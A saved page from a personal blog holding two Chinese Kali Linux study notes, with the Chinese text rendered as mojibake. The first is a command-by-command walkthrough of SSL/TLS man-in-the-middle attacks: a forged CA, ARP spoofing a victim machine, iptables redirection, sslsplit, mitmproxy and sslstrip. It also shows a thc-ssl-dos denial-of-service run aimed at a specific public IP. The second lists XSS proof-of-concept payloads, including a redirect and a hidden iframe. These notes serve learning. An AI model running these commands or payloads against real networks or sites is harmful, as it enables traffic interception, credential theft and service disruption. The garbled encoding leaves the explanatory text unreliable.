<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;2&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/" itemprop="url">Kali Linuxç¬”è®°(äº”åå…­)ï¼šSSLã€TLSä¸­é—´äººæ”»å‡»--ä¼ªé€ è¯ä¹¦</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-ä¸­é—´äººæ”»å‡»"><a href="#1-ä¸­é—´äººæ”»å‡»" class="headerlink" title="1. ä¸­é—´äººæ”»å‡»"></a>1. ä¸­é—´äººæ”»å‡»</h4><ul>
<li>æ”»å‡»è€…ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šä¿¡é“¾è·¯ä¸­<ul>
<li>ARPï¼ˆæ¬ºéª—å±€åŸŸç½‘å†…æ‰€æœ‰ä¸»æœºï¼Œè¯¯è®¤ä¸­é—´äººä¸ºç½‘å…³ï¼‰</li>
<li>DHCPï¼ˆè‹¥ä¸­é—´äººç‰©ç†è¿æ¥è·ç¦»å°äºDHCPæœåŠ¡å™¨ï¼Œä¸­é—´äººå¯å¼€æ”¾DHCPæœåŠ¡ï¼‰</li>
<li>ä¿®æ”¹ç½‘å…³ï¼ˆç†è®ºä¸Šå¯è¡Œï¼Œå®é™…ä¸Šå‡ ä¹ä¸å­˜åœ¨ï¼‰</li>
<li>ä¿®æ”¹DNSï¼ˆè®¾ç½®DNSè§£æåˆ°ä¸­é—´äººçš„æœåŠ¡ä¸Šï¼‰</li>
<li>ä¿®æ”¹HOSTSï¼ˆæœ¬åœ°åŸŸåè§£ææ–‡ä»¶ï¼Œä¼˜å…ˆçº§é«˜äºç½‘å¡çš„DNSæœåŠ¡å™¨ï¼‰</li>
<li>ICMPã€STPã€OSPFï¼ˆICMPçš„é‡å®šå‘ã€STPç”Ÿæˆæ ‘åè®®ã€OSPFè·¯ç”±åè®®ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­STP:ç”Ÿæˆæ ‘åè®®
1.å¤šä¸ªæ ¸å¿ƒå±‚äº¤æ¢æœºçš„å¤šçº¿è¿æ¥ï¼Œå®¹æ˜“å½¢æˆç¯è·¯
2.å¤šä¸ªæ ¸å¿ƒå±‚äº¤æ¢æœºçš„å†—æ‚å¤‡ä»½
â–² äº¤æ¢æœºç‰©ç†ä¸Šçš„ç¯è·¯ï¼Œé€šè¿‡ç”Ÿæˆæ ‘åè®®æ§åˆ¶ï¼Œå®ç°é€»è¾‘ä¸Šçš„æ— ç¯è·¯</code></pre></blockquote>
<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&file_name=/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" alt="ä¸­é—´äººæ”»å‡»"></p>
<ul>
<li>åŠ å¯†æµé‡</li>
<li>æ”»å‡»çš„å‰æ<ul>
<li>å®¢æˆ·ç«¯å·²ç»ä¿¡ä»»ä¼ªé€ è¯ä¹¦é¢å‘æœºæ„</li>
<li>æ”»å‡»è€…æ§åˆ¶äº†æ ¸å‘è¯ä¹¦é¢å‘æœºæ„</li>
<li>å®¢æˆ·ç«¯ç¨‹åºç¦æ­¢äº†æ˜¾ç¤ºè¯ä¹¦é”™è¯¯å‘Šè­¦ä¿¡æ¯</li>
<li>æ”»å‡»è€…å·²ç»æ§åˆ¶å®¢æˆ·ç«¯ï¼Œå¹¶å¼ºåˆ¶å…¶ä¿¡ä»»ä¼ªé€ è¯ä¹¦</li>
</ul>
</li>
<li>â–² ARPåœ°å€æ¬ºéª—æ˜¯å®ç°ä¸­é—´äººæ”»å‡»çš„å› ç´ ä¹‹ä¸€</li>
</ul>
<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
<li>SSLsplitï¼ˆè°ƒç”¨Opensslï¼‰<ul>
<li>é€æ˜SSL/TLSä¸­é—´äººæ”»å‡»å·¥å…·</li>
<li>å¯¹å®¢æˆ·ç«¯ä¼ªè£…æˆæœåŠ¡å™¨ï¼Œå¯¹æœåŠ¡å™¨ä¼ªè£…æˆæ™®é€šå®¢æˆ·ç«¯</li>
<li>ä¼ªè£…æœåŠ¡å™¨éœ€è¦ä¼ªé€ è¯ä¹¦</li>
<li>æ”¯æŒSSL/TLSåŠ å¯†çš„SMTPã€POP3ã€FTPç­‰é€šä¿¡ä¸­é—´äººæ”»å‡»</li>
</ul>
</li>
<li>åˆ©ç”¨opensslç”Ÿæˆè¯ä¹¦ç§é’¥<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl genrsa -out ca.key 2048</code></strong></li>
</ul>
</li>
<li>åˆ©ç”¨ç§é’¥ç­¾åç”Ÿæˆè¯ä¹¦<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šopenssl req -new -x509 -daysï¼ˆè¯ä¹¦æ—¶é—´ï¼‰ 1096 -key ca.key -out ca.crt</code></strong></li>
<li>å¡«å†™ç›¸å…³ä¿¡æ¯ï¼šCountryã€Provinceã€Locality Nameã€Organizationã€Organizational Nameã€FQDN Nameã€Email Address</li>
</ul>
</li>
<li>å¯ç”¨è·¯ç”±ï¼ˆä¸­é—´äººï¼‰/proc/sys/net/ipv4/ip_forward<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsysctl -w net.ipv4.ip_forward=1</code></strong></li>
</ul>
</li>
<li>iptablesç«¯å£è½¬å‘è§„åˆ™<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -F</code></strong>ï¼ˆæ¸…ç©ºå½“å‰æ‰€æœ‰è§„åˆ™ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -L</code></strong>ï¼ˆæŸ¥çœ‹æ·»åŠ çš„æ‰€æœ‰è§„åˆ™ï¼‰</li>
</ul>
</li>
<li>ARPæ¬ºéª—<ul>
<li>win7 â†’ <strong><code>ğŸ”ºå‘½ä»¤ï¼šarp aï¼ˆæŸ¥çœ‹ç½‘å…³MACåœ°å€ï¼‰</code></strong></li>
<li>Kali â†’ <strong><code>ğŸ”ºå‘½ä»¤ï¼šarpspoof -l eth0 -t 1.1.1.2ï¼ˆç›®æ ‡ä¸»æœºï¼‰ -r 1.1.1.1ï¼ˆæ¬ºéª—çš„ç½‘å…³ï¼‰</code></strong>â–² 2020.1.23ä¿®æ”¹-lå‚æ•°ä¸º-i</li>
</ul>
</li>
<li>å¯åŠ¨SSLsplit<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmkdir -p test/logdir</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsslsplit -Dï¼ˆdebugæ¨¡å¼ï¼‰-lï¼ˆè¿æ¥ä¿¡æ¯è®°å½•ï¼‰ connect.log -jï¼ˆ&quot;è¶Šç‹±ç›®å½•&quot;ï¼‰ /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></strong></li>
</ul>
</li>
<li>è¢«å®³è€…è®¿é—®taobaoï¼Œbaiduï¼Œmail.163.com</li>
<li>æŸ¥çœ‹æ—¥å¿—å’Œæµè§ˆå™¨è¯ä¹¦ï¼ˆconnect.logï¼Œ443.logï¼Œ80.logï¼‰</li>
<li>å®‰è£…æœåŠ¡å™¨æ ¹è¯ä¹¦åå†æ¬¡è®¿é—®<ul>
<li>æ‹·è´æ ¹è¯ä¹¦åˆ°win7ç”µè„‘ä¸Š</li>
<li>åŒå‡»è¯ä¹¦å®‰è£… â†’ å—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­taobaoçš„å®˜ç½‘ï¼Œé™¤äº†httpsåŠ å¯†ä¹‹å¤–ï¼Œè¿˜å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼ˆæ¯”å¦‚å¯†ç æ§ä»¶ï¼‰
â­å…¨ç«™httpså’Œéå…¨ç«™httpsçš„åŒºåˆ«ï¼Œéå…¨ç«™httpsæ˜¯æŒ‡å¯¹ç™»é™†çš„è´¦æˆ·å’Œå¯†ç ä½¿ç”¨httpsç™»é™†
â­å¯ä»¥é€šè¿‡grep 12334 * å»æŸ¥çœ‹è¦æŸ¥çœ‹çš„ä¿¡æ¯ï¼ˆæœç´¢æ—¥å¿—æ–‡ä»¶ï¼‰</code></pre></blockquote>
<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
<li>â–² åŒæ ·éœ€è¦arpåœ°å€æ¬ºéª—æ¥å®ç°SSLä¸­é—´äººæ”»å‡»</li>
<li>â–² è‡ªåŠ¨é›†æˆç”Ÿæˆä¸€å¼ è¯ä¹¦ï¼ˆåŒSSLsplitçš„è¯ä¹¦ä¸åŒï¼‰</li>
<li>Bugï¼šhttp(80)/https(443)åªèƒ½åœ¨8080ç«¯å£ä¾¦å¬</li>
<li>iptablesç«¯å£è½¬å‘è§„åˆ™<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -F</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šiptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
</ul>
</li>
<li>å¯åŠ¨mitmproxy<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šmitmproxy -T --host -w mitmproxy.log</code></strong>ï¼ˆçª—å£è®°å½•æµé‡ï¼‰</li>
<li>Tab ä¸‹ä¸€ä¸ªä¿¡æ¯/q é€€å‡º/ä¹Ÿå¯ä»¥é¼ æ ‡ç‚¹å‡»è®¿é—® </li>
<li>â–² 2020.1.24 -Tå‚æ•°ä¿®æ”¹ä¸º â€“mode transparentï¼Œ-hostå‚æ•°è¢«å–æ¶ˆ</li>
</ul>
</li>
</ul>
<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
<li>â–² åŒæ ·éœ€è¦arpåœ°å€æ¬ºéª—æ¥å®ç°SSLä¸­é—´äººæ”»å‡»</li>
<li>ä¸å‰ä¸¤ç§å·¥å…·ä¸åŒï¼Œå°†å®¢æˆ·ç«¯åˆ°ä¸­é—´äººä¹‹é—´çš„æµé‡å˜ä¸ºæ˜æ–‡</li>
<li>è‡ªåŠ¨ç”Ÿæˆsslstrip.logæ–‡ä»¶</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šsslstrip -l 8080</code></strong> â–² 2020.1.24è‹¥æ— æ³•è½¬å˜ï¼Œåˆ™ä¼šæŠ¥å»ºç«‹å®‰å…¨è¿æ¥å¤±è´¥</li>
</ul>
<h4 id="5-SSL-TLSæ‹’ç»æœåŠ¡æ”»å‡»"><a href="#5-SSL-TLSæ‹’ç»æœåŠ¡æ”»å‡»" class="headerlink" title="5. SSL/TLSæ‹’ç»æœåŠ¡æ”»å‡»"></a>5. SSL/TLSæ‹’ç»æœåŠ¡æ”»å‡»</h4><ul>
<li>thc-ssl-dos<ul>
<li>SSLåå•†åŠ å¯†å¯¹æ€§èƒ½å¼€é”€å¢åŠ ï¼Œå¤§é‡æ¡æ‰‹è¯·æ±‚ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡</li>
<li>åˆ©ç”¨SSL secure Renegotiationç‰¹æ€§ï¼Œåœ¨å•ä¸€TCPè¿æ¥ä¸­ç”Ÿæˆæ•°åƒä¸ªSSLé‡è¿æ¥è¯·æ±‚ï¼Œé€ æˆæœåŠ¡å™¨èµ„æºè¿‡è½½</li>
<li>ä¸æµé‡å¼æ‹’ç»æœåŠ¡æ”»å‡»ä¸åŒï¼Œthc-ssl-doså¯ä»¥åˆ©ç”¨ADSLçº¿è·¯æ‰“å®30Gå¸¦å®½çš„æœåŠ¡å™¨</li>
<li>æœåŠ¡å™¨å¹³å‡å¯ä»¥å¤„ç†300æ¬¡/ç§’SSLæ¡æ‰‹è¯·æ±‚</li>
<li>å¯¹SMTPSã€POP3ç­‰æœåŠ¡åŒæ ·æœ‰æ•ˆ</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šthc-ssl-dos 199.223.209.205 2083 --accept</code></strong> â–² 2020.1.23 Target has disabled renegotiations.</li>
</ul>
</li>
<li>å¯¹ç­–<ul>
<li>ç¦ç”¨SSL-Renegotiationã€ä½¿ç”¨SSL Accelerator</li>
<li>é€šè¿‡ä¿®æ”¹thc-ssl-dosä»£ç ï¼Œå¯ä»¥ç»•è¿‡ä»¥ä¸Šå¯¹ç­–</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/" itemprop="url">Kali Linuxç¬”è®°(äº”åäºŒ)ï¼šXSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1. XSS"></a>1. XSS</h4><ul>
<li>æ”»å‡»WEBå®¢æˆ·ç«¯</li>
<li>å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€<ul>
<li>å¼¹çª—å‘Šè­¦</li>
<li>Javascript</li>
<li>åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œ</li>
</ul>
</li>
<li>XSSï¼ˆcross-site scriptingï¼‰<ul>
<li>â–² é€šè¿‡WEBç«™ç‚¹æ¼æ´ï¼Œå‘å®¢æˆ·ç«¯äº¤ä»˜æ¶æ„è„šæœ¬ä»£ç ï¼Œå®ç°å¯¹å®¢æˆ·ç«¯çš„æ”»å‡»ç›®çš„</li>
<li>æ³¨å…¥å®¢æˆ·ç«¯è„šæœ¬ä»£ç </li>
<li>ç›—å–cookie</li>
<li>é‡å®šå‘</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­ä¹‹å‰çš„æ”»å‡»æ‰‹æ®µè„šæœ¬æ˜¯å¯¹æœåŠ¡ç«¯çš„æ”»å‡»
â­Browser â†’ Web Applicatipn â†’ Server â†’ Database
â­æœåŠ¡å™¨WEBç«™ç‚¹å­˜åœ¨æ¼æ´ï¼ŒHackeré€šè¿‡å®¢æˆ·ç«¯æäº¤ç»™WEBç«™ç‚¹ï¼Œæ”»å‡»WEBå®¢æˆ·ç«¯</code></pre></blockquote>
<ul>
<li>VBScriptï¼ˆé’ˆå¯¹å¾®è½¯æµè§ˆå™¨ï¼‰ï¼ŒActiveXï¼Œor Flash</li>
<li>JavaScript<ul>
<li>ä¸Javaè¯­è¨€æ— å…³</li>
<li>å‘½åå®Œå…¨å‡ºäºå¸‚åœºåŸå› </li>
<li>ä½¿ç”¨æœ€å¹¿çš„å®¢æˆ·ç«¯è„šæœ¬è¯­è¨€</li>
</ul>
</li>
<li>ä½¿ç”¨åœºæ™¯<ul>
<li>ç›´æ¥åµŒå…¥htmlï¼š<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
<li>å…ƒç´ æ ‡ç­¾äº‹ä»¶ï¼š<code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
<li>å›¾ç‰‡æ ‡ç­¾ï¼š<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
<li>å…¶ä»–æ ‡ç­¾ï¼š<code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
<li>DOMå¯¹è±¡ï¼Œç¯¡æ”¹é¡µé¢å†…å®¹</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­DOMï¼Œæ–‡æœ¬å¯¹è±¡æ¨¡å‹ï¼Œæ¯ä¸€ä¸ªé¡µé¢å¯¹åº”ä¸€ä¸ªDOMå¯¹è±¡ï¼Œæ¯ä¸ªé¡µé¢ä¸­çš„å…ƒç´ å¯¹åº”ä¸€ä¸ªDOMå¯¹è±¡ä¸­çš„å­å…ƒç´ ï¼ŒåŸºäºDOMæå‡ºäº†ä¸€äº›APIï¼Œå¯ä»¥ç”¨jSè°ƒç”¨DOMçš„APIè¿›è¡Œä¿®æ”¹å…ƒç´ ï¼Œä¸å‘æœåŠ¡å™¨ç«¯å‘é€è¯·æ±‚</code></pre></blockquote>
<ul>
<li>æ”»å‡»å‚ä¸æ–¹<ul>
<li>æ”»å‡»è€…</li>
<li>è¢«æ”»å‡»è€…</li>
<li>æ¼æ´ç«™ç‚¹</li>
<li>ç¬¬ä¸‰æ–¹ç«™ç‚¹ï¼ˆæ”»å‡»ç›®æ ‡ã€æ”»å‡»å‚ä¸ç«™ï¼‰</li>
</ul>
</li>
<li>æ¼æ´å½¢æˆçš„æ ¹æºï¼ˆä¼ å…¥ä¼ å‡ºæ— åšâ€æ¶ˆæ¯’â€ï¼‰<ul>
<li>æœåŠ¡å™¨å¯¹ç”¨æˆ·æäº¤æ•°æ®è¿‡æ»¤ä¸ä¸¥</li>
<li>æäº¤ç»™æœåŠ¡å™¨çš„è„šæœ¬è¢«ç›´æ¥è¿”å›ç»™å…¶ä»–å®¢æˆ·ç«¯æ‰§è¡Œ</li>
<li>è„šæœ¬åœ¨å®¢æˆ·ç«¯æ‰§è¡Œæ¶æ„æ“ä½œ</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­ç¬¬ä¸‰æ–¹ç«™ç‚¹å­˜åœ¨xssæ¼æ´ï¼ˆæ¯”å¦‚ç¬¬ä¸‰æ–¹ç«™ç‚¹ä¸ºæ·˜å®ï¼‰
1.å­˜æ”¾ä¸€ä¸ªjsä»£ç 
2.å®¢æˆ·ç«¯æ¯æ¬¡è®¿é—®ç¬¬ä¸‰æ–¹ç«™ç‚¹ï¼Œéƒ½ä¼šä¸‹è½½è¿™ä¸ªjsä»£ç 
3.jsä»£ç æŒ‡å‘ä¸€ä¸ªçœŸæ­£æ”»å‡»ç«™ç‚¹ï¼Œè‹¥è®¿é—®çš„æµé‡è¿‡å¤§ï¼Œä¼šå¯¹çœŸæ­£çš„ç›®æ ‡ç«™ç‚¹å½¢æˆDDOSæ”»å‡»</code></pre></blockquote>
<ul>
<li>XSSæ¼æ´ç±»å‹ï¼ˆâ–² å®¢æˆ·ç«¯å‘é€jsä»£ç ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨åŸå°ä¸åŠ¨è¿”å›jsä»£ç ç»™æµè§ˆå™¨ï¼‰<ul>
<li>å­˜å‚¨å‹ï¼ˆæŒä¹…å‹ï¼Œä¸€æ¬¡æ³¨å…¥æœåŠ¡å™¨å¹¶ä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šï¼‰</li>
<li>åå°„å‹ï¼ˆéæŒä¹…ï¼Œä¸€æ¬¡æ³¨å…¥æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç«‹åˆ»è¿”å›ç»™å‘èµ·æ–¹ï¼Œä¸ä¿å­˜ï¼‰</li>
<li>DOMå‹ï¼ˆæœ¬è´¨æ˜¯åå°„å‹ï¼Œåˆ©ç”¨æµè§ˆå™¨DOMç‰¹æ€§ï¼Œç›´æ¥åœ¨æœ¬åœ°æ‰§è¡Œä¿®æ”¹ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>â­åå°„å‹æ¼æ´åˆ©ç”¨
1.Hackeråˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦è°ƒæŸ¥ä¿¡æ¯ï¼Œç»™å—å®³è€…å‘é€ä¸€å°é‚®ä»¶ï¼Œæ¯”å¦‚åœ°å›¾ç­‰
2.å—å®³è€…ç‚¹å‡»åœ°å›¾ï¼Œä¼šå‘é€åœ°å›¾ä¸­çš„jsä»£ç ç»™æœ‰æ¼æ´çš„æœåŠ¡å™¨ï¼Œjsä»£ç å¯ä»¥ä¸ºç›‘è§†å™¨ç­‰
3.æœåŠ¡å™¨ç«¯åŸç«¯ä¸åŠ¨å‘é€jsä»£ç ç»™å—å®³è€…
4.jsä»£ç åˆ°è¾¾å®¢æˆ·ç«¯å¹¶åœ¨æµè§ˆå™¨æ‰§è¡Œ</code></pre></blockquote>
<ul>
<li><p>æ¼æ´PoC  â–²â–² å°è¯•ç»„åˆ</p>
<ul>
<li><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
<li><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;type&lt;/a&gt;</code>ï¼ˆonclick/onload/onerrorï¼‰</li>
<li><code>&lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
<li><code>&lt;script&gt;window.location=&quot;http://1.1.1.1&quot;&lt;/script&gt;</code></li>
<li><code>&lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height=&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
